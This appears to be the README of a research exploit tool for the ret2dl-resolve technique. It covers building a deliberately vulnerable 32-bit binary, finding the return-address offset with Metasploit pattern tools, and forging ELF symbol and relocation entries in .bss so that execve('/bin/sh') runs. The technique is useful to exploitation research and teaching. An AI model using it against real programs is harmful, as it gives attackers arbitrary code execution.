How to test
===========

1. Build vuln.c

    gcc -fno-stack-protector ../vuln.c -o /tmp/vuln -m32 -O2

2. Find the offset of the saved IP

    ruby19 "$METASPLOIT/tools/pattern_create.rb" 256 | /tmp/vuln
    dmesg | tail
    ruby19 "$METASPLOIT/tools/pattern_offset.rb" $SEGFAULT_IP

3. Launch the attack with the desired parameter

    (python ./exploit.py /tmp/vuln $OFFSET; echo ls) | /tmp/vuln

Basic idea
==========

char *buffer = .bss;
char *new_stack = buffer + 1024;
int *rubbish = new_stack + 4;

strcpy(buffer, "execve");
  *((int *) buffer) = 'exec';
  *(((int *) buffer) + 1) = 've\0\0';
char *name = buffer;
buffer += strlen(buffer) + 1;

Elf32_Sym *symbol = (Elf32_Sym *) buffer;
symbol->st_name = name - .dynstr;
symbol->st_value = 0;
symbol->st_info = 0;
symbol->st_other = 0;
symbol->st_shndx = 0;
buffer += sizeof(*symbol);

Elf32_Rel *reloc = (Elf32_Rel *) buffer;
reloc->r_offset = rubbish++;
reloc->r_info = (R_386_JUMP_SLOT | (symbol - .dynsym) / sizeof(symbol));
buffer += sizeof(reloc):

pre_plt((reloc - .rel.plt) / sizeof(Elf32_Rel));

Helper classes
==============

* `MemoryArea`: data structure representing a part of memory, with its
  start address, its size, a reference to what its relative to
  (e.g. the `MemoryArea` where we'll write the relocation structure
  will be relative to the `.rela.dyn` section).
* `Buffer`: data structure holding information about a buffer where we
  want to write to things. Typically this will represent to
  `.bss`. Buffer also keeps track of what part of it has already been
  allocated (`Buffer.current` points to the next free location) and
  allows to allocate new `MemoryArea`s with the appropriate
  alignement.

Exploit-derived classes
=======================

* `Exploit`: the base class, contains all the architecture- and
  platform-independent parts of the exploit. It keeps the list of the
  gadgets, it takes care of collecting all the interesting information
  about the program from the ELF file and abstracting some utility and
  memory-related functions (e.g. `write_pointer` and `write_string`)
  which rely on the abstract `do_writemem` function (which is
  platform- and program-dependent). Finally, in `jump_to`, contains
  the core logic for setting up the necessary data structures in the
  buffers.
* `CommonGadgetsExploit`: inherits from `Exploit` and introduces
  architecture-dependent parts, in particular gadgets and
  function-invocation logic.
* `ExecveExploit`: very simple class implementing the logic to launch
  an `execve`, so write a NULL pointer, a "/bin/sh\0" and explicitly
  look for `execve`. Finally invoke it.
